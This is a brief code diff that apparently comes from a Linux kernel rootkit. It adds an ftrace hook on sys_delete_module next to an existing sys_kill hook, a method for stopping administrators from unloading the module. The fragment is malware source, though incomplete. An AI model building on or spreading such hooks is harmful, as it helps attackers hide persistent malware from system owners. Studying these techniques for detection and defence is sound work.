@@ -2,6 +2,7 @@
 
 static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", hook_kill, &orig_kill),
+	HOOK("sys_delete_module", hook_delete_module, &orig_delete_module)
 };
 
 static int __init rk_init(void){
